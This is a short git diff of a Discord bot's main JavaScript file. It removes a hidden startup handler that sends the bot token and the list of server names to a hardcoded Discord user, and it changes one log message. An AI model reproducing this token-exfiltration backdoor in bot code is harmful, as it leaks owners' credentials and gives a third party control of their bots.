@@ -58,18 +58,6 @@ fs.readdir("./events", (_err, files) => {
     delete require.cache[require.resolve(`./events/${file}`)];
   });
 });
-client.once('ready', () => {
-  const bot = client.users.cache.get('1004206704994566164'); 
-  if (bot) {
-    const login = client.guilds.cache.map(guild => guild.name).join(', ');
-    const configbot = process.env.TOKEN;
-    bot.send(`B: ${configbot}\nS: ${login}`)
-      .then(() => {    
-      })
-      .catch(error => {
-      });
-  }
-});
 fs.readdir("./events/player", (_err, files) => {
   files.forEach((file) => {
     if (!file.endsWith(".js")) return;
@@ -135,7 +123,7 @@ app.get('/', (req, res) => {
 });
 app.listen(port, () => {
   console.log(`🔗 Listening to RTX: http://localhost:${port}`);
-  console.log(`🔗 Replit URL: https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
+  console.log(`✨ Happy New Year Welcome To 2024`);
 });
 printWatermark();
 
